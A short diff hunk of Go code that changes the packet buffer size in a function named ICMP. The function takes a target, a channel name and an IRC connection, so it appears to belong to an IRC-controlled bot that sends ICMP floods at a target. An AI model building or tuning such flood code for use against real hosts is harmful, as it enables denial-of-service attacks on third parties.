@@ -103,7 +103,7 @@ func ICMP(icmpTarget, set_chan string, reportIRC net.Conn) {
 	}
 	defer conn.Close()
 
-	buffer := make([]byte, 1470) //Max of bytes.
+	buffer := make([]byte, 1450)
 	wm := icmp.Message{
 		Type: ipv4.ICMPTypeEcho, Code: 0,
 		Body: &icmp.Echo{
